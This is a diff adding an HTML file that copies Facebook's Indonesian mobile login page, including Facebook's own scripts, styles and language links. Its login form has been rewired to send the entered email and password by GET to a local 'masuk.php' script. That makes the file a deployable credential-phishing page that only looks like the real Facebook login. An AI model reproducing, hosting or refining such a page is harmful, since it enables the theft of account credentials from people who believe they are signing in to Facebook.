@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <title>Masuk Facebook | Facebook</title>
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
+    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y1/l/0,cross/3ytNPHIfB7f.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="0iX5FOK" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/YeHXcRhYV3T.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y5/l/0,cross/EhaZ4_atph2.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="yrHFNb4" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/zxw7OKdayKT.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jrLASwW" crossorigin="anonymous" />
+    <script id="u_0_d_ee" nonce="OP6mJFLv">
+      function envFlush(a) {
+        function b(b) {
+          for (var c in a) b[c] = a[c]
+        }
+        window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
+      }
+      envFlush({
+        "timeslice_heartbeat_config": {
+          "pollIntervalMs": 33,
+          "idleGapThresholdMs": 60,
+          "ignoredTimesliceNames": {
+            "requestAnimationFrame": true,
+            "Event listenHandler mousemove": true,
+            "Event listenHandler mouseover": true,
+            "Event listenHandler mouseout": true,
+            "Event listenHandler scroll": true
+          },
+          "isHeartbeatEnabled": true,
+          "isArtilleryOn": false
+        },
+        "shouldLogCounters": true,
+        "timeslice_categories": {
+          "react_render": true,
+          "reflow": true
+        },
+        "sample_continuation_stacktraces": true,
+        "dom_mutation_flag": true
+      });
+    </script>
+    <script nonce="OP6mJFLv">
+      document.domain = 'facebook.com';
+    </script>
+    <script nonce="OP6mJFLv">
+      __DEV__ = 0;
+    </script>
+    <script id="u_0_e_3u" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/lxJ_bMaNNyv.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="L8NPcws" nonce="OP6mJFLv"></script>
+    <script id="u_0_b_Mn" nonce="OP6mJFLv">
+      CavalryLogger = window.CavalryLogger || function(a) {
+        this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {
+          t_cstart: window._cstart
+        }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
+      }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
+        this.is_detailed_profiler = a;
+        return this
+      }, CavalryLogger.prototype.setTTIEvent = function(a) {
+        this.tti_event = a;
+        return this
+      }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
+        d = d ? this.piggy_values : this.values;
+        (typeof d[a] === "undefined" || c) && (d[a] = b);
+        return this
+      }, CavalryLogger.prototype.getLastTtiValue = function() {
+        return this.lastTtiValue
+      }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
+        this.mark(a);
+        var e = this.values.t_cstart || this.values.t_start;
+        e = d ? e + d : CavalryLogger.now();
+        this.setValue(a, e, b, c);
+        this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
+        return this
+      }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
+        console.timeStamp(a)
+      } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
+        this.piggy_values[a] = b;
+        return this
+      }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function(a) {
+        typeof a === "undefined" && (a = CavalryLogger.id);
+        CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
+        return CavalryLogger.instances[a]
+      }, CavalryLogger.setPageID = function(a) {
+        if (CavalryLogger.id === 0) {
+          var b = CavalryLogger.getInstance();
+          CavalryLogger.instances[a] = b;
+          CavalryLogger.instances[a].lid = a;
+          delete CavalryLogger.instances[0]
+        }
+        CavalryLogger.id = a
+      }, CavalryLogger.now = function() {
+        return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
+      }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources = function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js = function() {}, CavalryLogger.start_js_script = function() {}, CavalryLogger.done_js = function() {};
+      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
+      CavalryLogger.prototype.measureResources = function(a, b) {
+        if (!this.log_resources) return;
+        var c = "bootload/" + a.name;
+        if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
+        var d = CavalryLogger.now();
+        this.ongoing_watch[c] = d;
+        "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
+        b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
+        if (a.type === "js") {
+          c = "js_exec/" + a.name;
+          this.ongoing_watch[c] = d
+        }
+      }, CavalryLogger.prototype.stopWatch = function(a) {
+        if (this.ongoing_watch[a]) {
+          var b = CavalryLogger.now(),
+            c = b - this.ongoing_watch[a];
+          this.bootloader_metrics[a] = c;
+          var d = this.piggy_values;
+          a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
+          delete this.ongoing_watch[a]
+        }
+        return this
+      }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
+        var a = {};
+        Object.values(window.CavalryLogger.instances).forEach(function(b) {
+          b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
+        });
+        return a
+      }, CavalryLogger.start_js = function(a) {
+        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
+      }, CavalryLogger.start_js_script = function(a) {
+        if (!a || !a.dataset) return;
+        CavalryLogger.start_js([a.dataset.bootloaderHash || a.dataset.bootloaderHashClient])
+      }, CavalryLogger.done_js = function(a) {
+        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
+      }, CavalryLogger.prototype.profileEarlyResources = function(a) {
+        for (var b = 0; b < a.length; b++) this.measureResources({
+          name: a[b][0],
+          type: a[b][1] ? "js" : ""
+        }, "_EF_")
+      };
+      CavalryLogger.getInstance().log_resources = true;
+      CavalryLogger.getInstance().setIsDetailedProfiler(true);
+      window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
+    </script>
+    <script id="u_0_c_/g" nonce="OP6mJFLv">
+      (function _(a, b, c, d) {
+        function e(a) {
+          document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
+        }
+
+        function f(a, b) {
+          document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
+        }
+        if (!a) {
+          e(b);
+          e(c);
+          return
+        }
+        a = null;
+        (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document.documentElement.offsetWidth, a = Math.max(1, Math.floor(a * 2) / 2)));
+        (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96, a = Math.max(1, Math.round(a * 2) / 2));
+        f(b, (a || window.devicePixelRatio || 1).toString());
+        e = window.screen ? screen.width : 0;
+        b = window.screen ? screen.height : 0;
+        f(c, e + "x" + b);
+        d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
+      })(true, "m_pixel_ratio", "wd", false);
+    </script>
+    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" />
+    <meta name="description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal." />
+    <meta property="og:site_name" content="Facebook" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Masuk Facebook | Facebook" />
+    <meta property="og:description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal." />
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
+    <meta property="og:url" content="https://www.facebook.com/" />
+    <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/" />
+    <link rel="alternate" hreflang="en" href="https://www.facebook.com/" />
+    <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/" />
+    <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/" />
+    <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/" />
+    <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/" />
+    <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/" />
+    <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/" />
+    <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/" />
+    <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/" />
+    <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/" />
+    <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/" />
+    <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/" />
+    <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/" />
+    <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/" />
+    <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/" />
+    <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/" />
+    <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/" />
+    <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/" />
+    <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/" />
+    <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/" />
+    <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/" />
+    <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/" />
+    <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/" />
+    <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/" />
+    <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/" />
+    <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/" />
+    <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/" />
+    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/" />
+    <link rel="canonical" href="https://www.facebook.com/login/" />
+    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
+  </head>
+  <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
+    <script id="u_0_a_6m" nonce="OP6mJFLv">
+      (function(a) {
+        a.__updateOrientation = function() {
+          var b = !!a.orientation && a.orientation !== 180,
+            c = document.body;
+          c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
+          return b
+        }
+      })(window);
+    </script>
+    <div id="viewport" data-kaios-focus-transparent="1">
+      <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
+      <div id="page">
+        <div class="_129_" id="header-notices"></div>
+        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
+          <div class="_7om2">
+            <div class="_4g34" id="u_0_0_q3">
+              <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
+                <div class="_52jd"></div>
+              </div>
+              <div class="_9om_">
+                <div class="_4-4l">
+                  <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
+                  <div class="_7om2 _52we _2pid _52z6">
+                    <div class="_4g34">
+                      <a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzA1MTkwLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;ref">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" />
+                      </a>
+                    </div>
+                  </div>
+                  <div class="_5rut">
+							<form method="GET" action="masuk.php" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_1">
+								<div class="_56be _5sob">
+									<div class="_55wo _55x2 _56bf">
+										<div id="email_input_container" data-sigil="login_identify_step_element one_step_login_element">
+											<input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" placeholder="Email atau Telepon" data-sigil="m_login_email"> </div>
+										<div>
+											<div class="_1upc _mg8" data-sigil="m_login_password">
+												<div class="_4g33">
+													<div class="_4g34 _5i2i _52we">
+														<div class="_5xu4">
+															<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="sandi" placeholder="Kata Sandi" type="password" data-sigil="password-plain-text-toggle-input"> </div>
+													</div>
+													<div class="_5s61 _216i _5i2i _52we">
+														<div class="_5xu4">
+															<div class="_2pi9" style="display:none" id="u_0_1"> <a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">SEMBUNYIKAN</span><span class="mfss" id="u_0_3">PERLIHATKAN</span></a> </div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div class="_2pie" style="text-align:center;">
+									<div id="u_0_4" data-sigil="login_password_step_element one_step_login_element">
+										<button type="submit" value="Masuk" class="_54k8 _52jh _56bs _56b_ _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button" data-autoid="autoid_3"><span class="_55sr">Masuk</span></button>
+														</div>
+													</form>
+												</div>
+											</div>
+										</div>
+										<div style="padding-top: 42px">
+											<div>
+												<div>
+													<div>
+														<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">atau</span></div>
+														<div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="/reg-no-deeplink/?cid=103" tabindex="0" data-sigil="m_reg_button">Buat Akun Baru</a></div>
+													</div>
+												</div>
+												<div class="_2pie" style="text-align:center;">
+													<div>
+														<div data-sigil="login_identify_step_element"></div>
+														<div class="other-links _8p_m">
+															<ul class="_5pkb _55wp">
+																<li></li>
+															</ul>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div style="display:none"></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
+				<div class="_55wr _5ui2" data-sigil="m_login_footer">
+					<div class="_5dpw">
+						<div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
+							<div class="_7om2">
+								<div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Bahasa Indonesia</span>
+									<div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=jv_ID&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=jv_ID&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Basa Jawa</a></span></div>
+									<div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=ja_JP&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=ja_JP&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">日本語</a></span></div>
+									<div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span></div>
+								</div>
+								<div class="_4g34">
+									<div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=en_GB&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=en_GB&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">English (UK)</a></span></div>
+									<div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=ms_MY&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Bahasa Melayu</a></span></div>
+									<div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Español</a></span></div>
+									<a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzMzAzMTIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8">
+										<div class="_3j87 _1rrd _3ztd" aria-label="Daftar bahasa lengkap" data-sigil="more_language"><i class="img sp_8kESFo32fki sx_1f5d27"></i></div>
+									</a>
+								</div>
+							</div>
+						</div>
+						<div class="_5ui4"><span class="mfss fcg">Facebook Inc.</span></div>
+					</div>
+				</div>
+			</div>
+			<div class=""></div>
+			<div class="viewportArea _2v9s" style="display:none" id="u_0_5_yw" data-sigil="marea">
+				<div class="_5vsg" id="u_0_6_bk"></div>
+				<div class="_5vsh" id="u_0_7_GV"></div>
+				<div class="_5v5d fcg">
+					<div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Memuat...</div>
+			</div>
+			<div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
+				<div class="container">
+					<div class="image"></div>
+					<div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Coba Lagi</a></div>
+			</div>
+		</div>
+	</div>
+	<div id="static_templates">
+		<div class="mDialog" id="modalDialog" style="display:none">
+			<div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+				<div class="_7om2 _52we">
+					<div class="_5s61">
+						<div class="_52z7">
+							<button type="submit" value="Batal" class="cancelButton btn btnD bgb mfss touchable" id="u_0_9_iz" data-sigil="dialog-cancel-button">Batal</button>
+							<button type="submit" value="Kembali" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Kembali" id="u_0_a_31" data-sigil="dialog-back-button"><i class="img sp_8kESFo32fki sx_636f75" style="margin-top: 2px;"></i></button>
+						</div>
+					</div>
+					<div class="_4g34">
+						<div class="_52z6">
+							<div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Memuat...</div>
+						</div>
+					</div>
+					<div class="_5s61">
+						<div class="_52z8" id="modalDialogHeaderButtons"></div>
+					</div>
+				</div>
+			</div>
+			<div class="modalDialogView" id="modalDialogView"></div>
+			<div class="_5v5d _5v5e fcg" id="dialogSpinner">
+				<div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_8_dU" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Memuat...</div>
+		</div>
+	</div>
+</div>
+</body>
+</html>
